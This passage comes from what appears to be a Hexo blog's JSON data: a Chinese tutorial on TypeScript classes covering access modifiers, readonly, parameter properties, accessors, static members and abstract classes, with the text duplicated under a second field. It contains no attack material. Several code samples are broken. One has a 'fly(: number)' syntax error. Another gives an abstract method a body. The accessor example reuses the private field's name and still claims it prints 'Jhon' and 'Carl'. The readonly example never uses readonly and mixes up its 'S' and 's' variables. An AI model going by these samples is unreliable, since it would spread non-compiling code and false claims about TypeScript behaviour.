class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> Super &#123;</span><br><span class=\"line\">    <span class=\"comment\">// let name: string;</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> name: <span class=\"built_in\">string</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">constructor</span>(<span class=\"params\">n: <span class=\"built_in\">string</span></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name = n;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> fly () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">`<span class=\"subst\">$&#123;this.name&#125;</span> can fly!`</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> Son <span class=\"keyword\">extends</span> Super &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    handle() &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> S = <span class=\"keyword\">new</span> Super(); <span class=\"comment\">// error, super是被保护的。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> s = <span class=\"keyword\">new</span> Son(); <span class=\"comment\">// success</span></span><br></pre></td></tr></table></figure>\n<p><strong>只读属性 readonly</strong></p>\n<p>只读属性不能被修改，必须在 <code>声明时或者构造函数</code> 里被初始化。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> Super &#123;</span><br><span class=\"line\">    <span class=\"comment\">// let name: string;</span></span><br><span class=\"line\">    name: <span class=\"built_in\">string</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\">n: <span class=\"built_in\">string</span></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name = n;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> fly () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">`<span class=\"subst\">$&#123;this.name&#125;</span> can fly!`</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> S = <span class=\"keyword\">new</span> Super(<span class=\"string\">'Jhon'</span>);</span><br><span class=\"line\">s.name = <span class=\"string\">'Carl'</span>; <span class=\"comment\">// error</span></span><br></pre></td></tr></table></figure>\n<p><strong>参数属性</strong></p>\n<p>在上面的例子中，我们总会声明一个 <code>name</code> 之后再通过构造器赋值。这种做法未免有些麻烦，通过 <code>参数属性</code> 我们可以将声明和赋值结合。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> Super &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> name: <span class=\"built_in\">string</span></span>) &#123; &#125; <span class=\"comment\">// 直接在构造函数的参数中进行 声明、赋值</span></span><br><span class=\"line\">    fly(: <span class=\"built_in\">number</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>储存器</strong></p>\n<p>通过储存器，我们可以修改上文中提到的 <code>private</code> 属性。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> Super &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> name: <span class=\"built_in\">string</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\">n: <span class=\"built_in\">string</span></span>) &#123; <span class=\"keyword\">this</span>.name = n &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">get</span> name(): <span class=\"built_in\">string</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">set</span> name(n: <span class=\"built_in\">string</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name = n;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> s = <span class=\"keyword\">new</span> Super(<span class=\"string\">'Jhon'</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(s.name); <span class=\"comment\">// -&gt; 'Jhon'</span></span><br><span class=\"line\"></span><br><span class=\"line\">s.name = <span class=\"string\">'Carl'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(s.name); <span class=\"comment\">// -&gt; 'Carl'</span></span><br></pre></td></tr></table></figure>\n<p><strong>静态属性 static</strong></p>\n<p>上面的例子中属性大多都是实例化之后才能访问到的属性，通过 <code>static</code> 我们可以给类设置静态属性。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> Super &#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> name = <span class=\"string\">'Jhon'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"></span>) &#123;  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(Super.name); <span class=\"comment\">// -&gt; 'Jhon'</span></span><br></pre></td></tr></table></figure>\n<p><strong>抽象类 abstract</strong></p>\n<p>抽象类作为其它子类的父类使用，不能被实例化；不同于接口，抽象类可以包含成员的实现细节。<br>抽象类中的抽象方法不包含具体实现并且必须在派生类中实现。 抽象方法的语法与接口方法相似，两者都是定义方法签名但不包含方法体。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> Super &#123;</span><br><span class=\"line\">    <span class=\"keyword\">abstract</span> name: <span class=\"built_in\">string</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">abstract</span> fly(): <span class=\"built_in\">void</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> Son <span class=\"keyword\">extends</span> Super &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    eat():<span class=\"built_in\">void</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> S = <span class=\"keyword\">new</span> Super(); <span class=\"comment\">// -&gt; error，抽象类不能被实例化</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> s = <span class=\"keyword\">new</span> Son(); <span class=\"comment\">// -&gt; success</span></span><br><span class=\"line\"></span><br><span class=\"line\">s.fly(); <span class=\"comment\">// -&gt; success </span></span><br><span class=\"line\">s.eat(); <span class=\"comment\">// -&gt; error, 抽象类中没有 eat 方法</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h4><p><code>typescript</code> 中的类其实就是 <code>javascript</code> 中的构造函数；他们的用法完全相似，只不过 <code>typescript</code> 给构造函数添加了一些后端语言才有的 <code>修饰符</code>。</p>\n","site":{"data":{}},"excerpt":"<p><code>typescript</code> 中的类与 <code>ES6</code> 中的 <code>class</code> 功能及使用基本一致；不过 <code>typescript</code> 对于属性的定义却是使用了一些后端语言的关键字。<br>","more":"</p>\n<h3 id=\"类\"><a href=\"#类\" class=\"headerlink\" title=\"类\"></a>类</h3><p><code>typescript</code> 中的类与 <code>ES6</code> 中的 <code>class</code> 功能及使用基本一致；不过 <code>typescript</code> 对于属性的定义却是使用了一些后端语言的关键字。</p>\n<h4 id=\"类的集成\"><a href=\"#类的集成\" class=\"headerlink\" title=\"类的集成\"></a>类的集成</h4><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> Super &#123;</span><br><span class=\"line\">    <span class=\"comment\">// let name: string;</span></span><br><span class=\"line\">    name: <span class=\"built_in\">string</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\">n: <span class=\"built_in\">string</span></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name = n;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    fly () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">`<span class=\"subst\">$&#123;this.name&#125;</span> can fly!`</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> Son <span class=\"keyword\">extends</span> Super &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 在 ts 中，子类继承父类，如果之类中声明了 构造器(constructor) 则必须调用 super()</span></span><br><span class=\"line\">    <span class=\"comment\">// 否则 ts 会抛出错误</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//...</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"公共，私有与受保护的修饰符\"><a href=\"#公共，私有与受保护的修饰符\" class=\"headerlink\" title=\"公共，私有与受保护的修饰符\"></a>公共，私有与受保护的修饰符</h4><p><strong>默认值 public</strong></p>\n<p>如果一个类中的成员没有显示的表明修饰符，那么默认他们都是 <code>public</code>。<br>上面的例子和下面的效果是一致的：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> Super &#123;</span><br><span class=\"line\">    <span class=\"comment\">// let name: string;</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> name: <span class=\"built_in\">string</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">constructor</span>(<span class=\"params\">n: <span class=\"built_in\">string</span></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name = n;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> fly () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">`<span class=\"subst\">$&#123;this.name&#125;</span> can fly!`</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>私有属性 private</strong></p>\n<p>如果一个类中的成员被标记为 <code>private</code>，那么它就不能在该类的外部被访问，因为它是私有的。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> Super &#123;</span><br><span class=\"line\">    <span class=\"comment\">// let name: string;</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> name: <span class=\"built_in\">string</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\">n: <span class=\"built_in\">string</span></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name = n;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> fly () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">`<span class=\"subst\">$&#123;this.name&#125;</span> can fly!`</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// error</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"keyword\">new</span> Super(<span class=\"string\">'Bird'</span>).name)</span><br></pre></td></tr></table></figure>\n<p><strong>受保护属性 protected</strong></p>\n<p><code>protected</code> 与 <code>private</code> 的行为相似，但是 <code>protected</code> 的属性在 <code>子类内部</code> 中仍然可以访问。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> Super &#123;</span><br><span class=\"line\">    <span class=\"comment\">// let name: string;</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> name: <span class=\"built_in\">string</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\">n: <span class=\"built_in\">string</span></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name = n;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> fly () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">`<span class=\"subst\">$&#123;this.name&#125;</span> can fly!`</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> Son <span class=\"keyword\">extends</span> Super &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(name)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    handle() &#123;</span><br><span class=\"line\">        <span class=\"comment\">// success</span></span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>.name)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 能成功输出</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"keyword\">new</span> Son().handle)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// error</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"keyword\">new</span> Son().name)</span><br></pre></td></tr></table></figure>\n<p>构造函数被标记为 <code>protected</code> 时，该类不能被实例化，但可以被继承，继承它的之类可以被实例化。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> Super &#123;</span><br><span class=\"line\">    <span class=\"comment\">// let name: string;</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> name: <span class=\"built_in\">string</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">constructor</span>(<span class=\"params\">n: <span class=\"built_in\">string</span></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name = n;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> fly () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">`<span class=\"subst\">$&#123;this.name&#125;</span> can fly!`</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> Son <span class=\"keyword\">extends</span> Super &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    handle() &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> S = <span class=\"keyword\">new</span> Super(); <span class=\"comment\">// error, super是被保护的。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> s = <span class=\"keyword\">new</span> Son(); <span class=\"comment\">// success</span></span><br></pre></td></tr></table></figure>\n<p><strong>只读属性 readonly</strong></p>\n<p>只读属性不能被修改，必须在 <code>声明时或者构造函数</code> 里被初始化。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> Super &#123;</span><br><span class=\"line\">    <span class=\"comment\">// let name: string;</span></span><br><span class=\"line\">    name: <span class=\"built_in\">string</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\">n: <span class=\"built_in\">string</span></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name = n;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> fly () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">`<span class=\"subst\">$&#123;this.name&#125;</span> can fly!`</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> S = <span class=\"keyword\">new</span> Super(<span class=\"string\">'Jhon'</span>);</span><br><span class=\"line\">s.name = <span class=\"string\">'Carl'</span>; <span class=\"comment\">// error</span></span><br></pre></td></tr></table></figure>\n<p><strong>参数属性</strong></p>\n<p>在上面的例子中，我们总会声明一个 <code>name</code> 之后再通过构造器赋值。这种做法未免有些麻烦，通过 <code>参数属性</code> 我们可以将声明和赋值结合。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> Super &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> name: <span class=\"built_in\">string</span></span>) &#123; &#125; <span class=\"comment\">// 直接在构造函数的参数中进行 声明、赋值</span></span><br><span class=\"line\">    fly(: <span class=\"built_in\">number</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>储存器</strong></p>\n<p>通过储存器，我们可以修改上文中提到的 <code>private</code> 属性。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> Super &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> name: <span class=\"built_in\">string</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\">n: <span class=\"built_in\">string</span></span>) &#123; <span class=\"keyword\">this</span>.name = n &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">get</span> name(): <span class=\"built_in\">string</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">set</span> name(n: <span class=\"built_in\">string</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name = n;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> s = <span class=\"keyword\">new</span> Super(<span class=\"string\">'Jhon'</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(s.name); <span class=\"comment\">// -&gt; 'Jhon'</span></span><br><span class=\"line\"></span><br><span class=\"line\">s.name = <span class=\"string\">'Carl'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(s.name); <span class=\"comment\">// -&gt; 'Carl'</span></span><br></pre></td></tr></table></figure>\n<p><strong>静态属性 static</strong></p>\n<p>上面的例子中属性大多都是实例化之后才能访问到的属性，通过 <code>static</code> 我们可以给类设置静态属性。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> Super &#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> name = <span class=\"string\">'Jhon'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"></span>) &#123;  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(Super.name); <span class=\"comment\">// -&gt; 'Jhon'</span></span><br></pre></td></tr></table></figure>\n<p><strong>抽象类 abstract</strong></p>\n<p>抽象类作为其它子类的父类使用，不能被实例化；不同于接口，抽象类可以包含成员的实现细节。<br>抽象类中的抽象方法不包含具体实现并且必须在派生类中实现。 抽象方法的语法与接口方法相似，两者都是定义方法签名但不包含方法体。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span 